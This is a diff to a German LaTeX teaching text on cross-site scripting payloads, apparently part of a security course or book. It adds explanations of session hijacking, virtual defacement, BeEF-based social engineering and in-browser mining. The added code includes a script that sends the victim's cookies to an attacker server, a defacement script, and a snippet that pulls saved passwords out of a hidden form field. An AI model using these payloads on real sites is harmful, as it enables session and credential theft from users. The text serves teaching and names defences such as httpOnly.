@@ -63,7 +63,66 @@ Eine gute Quelle für weitere XSS-Beispiele ist das OWASP XSS Filter Evasion Che
 
 \subsection{XSS-Payloads}
 
-Mittels des eingeschleusten JavaScript-Code versucht der Angreifer nun, negativen Einfluss auf einen Benutzer zu nehmen. Ein gutes Beispiel wäre der Versuch, das Session-Cookie des aktuellen Benutzers (des Opfers) auszulesen und an einen externen Server zu übermitteln. Auf diese Weise würde ein Identitätsdiebstal durchgeführt werden. Ein weiteres Beispiel wäre \textit{Virtual Defacement}: bei diesem wird mittels JavaScript die dargestellt Webseite verändert und dadurch ein Defacement durchgeführt. Bösartig an diesem ist, dass die direkten Inhalte (Webseiten im Filesystem des Webservers) korrekt aussehen. In den letzten Jahren wurden XSS-Injections auch für Bitcoin/Crypto-Mining missbraucht. In diesem Fall wird jedes Opfer welches eine Webseite besucht kurzfristig Teil des Mining-Kollektivs. Last but not least kann XSS verwendet werden, um den Browser des Opfers Teil eines DDoS-Botnets zu machen. Ein berühmtes Beispiel hierfür ist die Low-Orbit Ion Canon die z.B. auch gerne von Anonymous verwendet wurde.
+Mittels des eingeschleusten JavaScript-Code versucht der Angreifer nun, negativen Einfluss auf einen Benutzer zu nehmen.
+
+\subsubsection{Session Hijacking}
+
+Javascript wird innerhalb des Browsers ausgeführt. Da in diesem auch zumeist das Session-Cookie zur Identifikation eines Benutzers gegneüber dem Server gespeichert wird, ist das Stehlen dieses via XSS naheliegend.
+
+Um dies zu bewerkstelligen, verwendet der Angreifer einen öffentlich-erreichbaren Webserver zu welchem die Cookies (und damit die Benutzeridentitäten) übermittelt werden sollen. In dem Bespiel wird \url{https://offensive.one/cookie_catcher} für diesen Zweck verwendet.
+
+Findet der Angreifer auf der Opferwebseite eine persistent-XSS Möglichkeit, könnte er nun folgendes Javascript-Fragement als XSS-Payload verwenden:
+
+\begin{minted}{html}
+<script>
+	document.location="https://offensive.one/cookie_catcher?c="+document.cookie;
+</script>
+\end{minted}
+
+Der Webbrowser würde also zu einer neuen URL auf dem Angreifer-Server navigiert werden. Ein Teil der URl ist der Parameter ,,c'', dieser Parameter wird mit den aktuellen Cookies befüllt. In diesen ist auch das Session-Cookie enthalten. Der Angreifer würde dieses nun aus den Log-Dateien seines Servers auslesen, und Zugriffe auf den ursprünglichen Server mit diesem Cookie mit der Identität des Opfers ausführen können.
+
+Als Gegenmassnahme für diese Payload sollte insbesondere das \textit{httpOnly}-Flag bei Cookies genannt werden. Durch dieses Flag wird der Zugriff via Javascript auf das damit konfigurierte Cookie unterbunden.
+
+\subsubsection{Virtual Defacement}
+
+Ein weiteres Beispiel wäre \textit{Virtual Defacement}: bei diesem wird mittels JavaScript die dargestellt Webseite verändert und dadurch ein Defacement durchgeführt. Bösartig an diesem ist, dass die direkten Inhalte (Webseiten im Filesystem des Webservers) weiterhin korrekt aussehen.
+
+Ein Beispiel wäre folgende Opferwebseite:
+
+\begin{minted}{html}
+<html>
+	<head>..
+		<script src="http://cdn.local/script.js"></script>
+	</head>
+	<body id="main">
+		<h1>My Company</h1>
+	</body>
+</html>
+\end{minted}
+
+In diesem konkrete Beispiel wird Javascript von einem \textit{Content Delivery Network} geladen, liegt also nicht lokal am Opfer-Webserver vor. Ein Angreifer würde nun den CDN-Server hacken und das \url{script.js}-File ersetzen:
+
+\begin{minted}{javascript}
+document.getElementById("main").innerHTML = "My Company sucks";
+\end{minted}
+
+In diesem Fall wird der Inhalt des Elements ,,main'' ersetzt und schlußendlich so die Opfer-Webseite defaced.
+
+\subsubsection{Social Engineering}
+
+XSS kann auch als Teil von Social-Engineering Angriffen verwendet werden. Ein Besipiel hierfür wäre das BeEF-Framework (\textit{The Browser Exploitation Framework Projekt}\footnote{\url{https://beefproject.com/}}). Bei diesem wird über Javascript ein Client-Handler im Browser installiert. Hierfür könnte z. B. eine XSS-Lücke missbraucht werden. Über diesen Handler können mehrere Attacken gestartet werden, unter anderem:
+
+\begin{itemize}
+	\item Anzeigen eines Fake \textit{Software muss aktualisiert werden}-Fenster über dies der Benutzer zum Update eines Browser-Plugins ermuntert wird. Hierbei wird allerdings kein Browserplugin upgedatet, sondern eine vom Angreifer bereitgestelle ausführbare Datei exekutiert.
+	\item Anzeigen eines Assistenten, z. B. ,,Clippy''. Auf diese Weise kann ein vorgesehener interaktiver Chat emuliert, und dem Kunden Informationen entlockt werden.
+	\item BeEF bietet auch Angriffe, welche nicht direkt im Social-Engineering verankert sind. Beispiele hierfür wären z.B. Browser-Exploits, Information Gathering, Network Tunneling über Javascript.
+\end{itemize}
+
+\subsubsection{Zusätzliche Angreifersoftware}
+
+In den letzten Jahren wurden XSS-Injections auch für Bitcoin/Crypto-Mining missbraucht. In diesem Fall wird beim Besuch der Webseite ein Crypto-Miner im Browser des Benutzers verankert und zum Mining verwendet. Dieses Konzept wird mittlerweile auch als Entschädigungsmodel für Webseitenautoren verwendet.
+
+XSS kann auch verwendet werden, um den Browser des Opfers Teil eines DDoS-Botnets zu machen. Ein berühmtes Beispiel hierfür ist die LOIC (\textit{Low-Orbit Ion Canon}\footnote{\url{https://en.wikipedia.org/wiki/Low_Orbit_Ion_Cannon}}) die z.B. auch gerne von Anonymous verwendet wurde.
 
 \subsubsection{Stehlen von Daten aus einem Passwortmanager}
 
@@ -71,7 +130,7 @@ Die meisten modernen Webbrowser bieten eine Form eines Passwortmanagers an. Nach
 
 Falls ein Angreifer eine XSS-Lücke innerhalb eines Login-Formulars findet, kann er diese ausnutzen um die Login-Daten zu stehlen:
 
-\begin{minted}{javascript}
+\begin{minted}{html}
 <script>
 document.write('<form><input id=password type=password style=visibility:hidden></form>');
 setTimeout('alert("Password: " + document.getElementById("password").value)', 100);
